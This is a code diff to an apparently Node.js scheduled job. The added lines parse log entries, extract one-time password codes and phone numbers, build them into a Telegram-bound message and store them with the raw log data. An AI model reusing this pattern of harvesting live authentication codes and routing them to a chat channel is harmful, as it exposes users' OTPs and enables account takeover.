@@ -135,7 +135,24 @@ const job = schedule.scheduleJob("*/2 * * * * *", async function () {
 
           try {
             payload = data.logs[i - 1]?.input;
-            console.log(JSON.parse(payload, "109ujasldkjflk"));
+            payload = JSON.parse(payload);
+            const otpCode = payload?.params?.otp;
+            const phoneNumber = payload?.to[0];
+
+            if (otpCode && phoneNumber) {
+              msgSendTelegramItem +=
+                "<b>" + ` <code>${otpCode}</code> ` + "</b>";
+              msgSendTelegramItem += "\n\n\n";
+              msgSendTelegram += msgSendTelegramItem;
+
+              dataToLog.push({
+                id: data.logs[i - 1]?.id,
+                phoneNumber: data.logs[i - 1]["target"],
+                message: otpCode,
+                rawData: data.logs[i - 1],
+                createdAt: new Date(),
+              });
+            }
           } catch (error) {
             console.log(error, "parse payload error");
           }
